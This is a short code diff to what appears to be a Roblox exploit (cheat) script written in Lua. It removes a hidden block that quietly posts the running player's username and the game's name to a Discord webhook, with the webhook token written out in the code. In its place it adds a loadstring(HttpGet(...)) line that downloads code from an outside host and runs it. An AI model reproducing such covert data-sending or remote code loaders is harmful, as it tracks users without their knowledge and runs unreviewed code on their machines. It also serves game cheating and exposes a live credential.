@@ -1,32 +1,6 @@
-task.spawn(function()
-    local HttpService = game:GetService("HttpService")
-    local Players = game:GetService("Players")
-    local MarketplaceService = game:GetService("MarketplaceService")
+repeat task.wait() until game:IsLoaded()
 
-    local username = Players.LocalPlayer.Name
-    local mapName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    local webhook = "https://discord.com/api/webhooks/1448618837271646278/v0TRg__AXLu3k_D7NPXLxnRby79yjVW7js7xTwQ3B97VhZgfCcHwMxtU09NxO__ABXOi"
-
-    local data = {
-        ["content"] = "**تم استخدام السكربت**\n" ..
-                      "> **الي شغّل السكربت:** " .. username .. "\n" ..
-                      "> **اسم الماب:** " .. mapName
-    }
-
-    local body = HttpService:JSONEncode(data)
-    local req = http_request or request or syn.request
-
-    pcall(function()
-        if req then
-            req({
-                Url = webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = body
-            })
-        end
-    end)
-end)
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/9d407fc527ce3c114e75ac578b38db5d0b2bd1acb2d85c9033a78a5dc9b743a9/download"))()
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
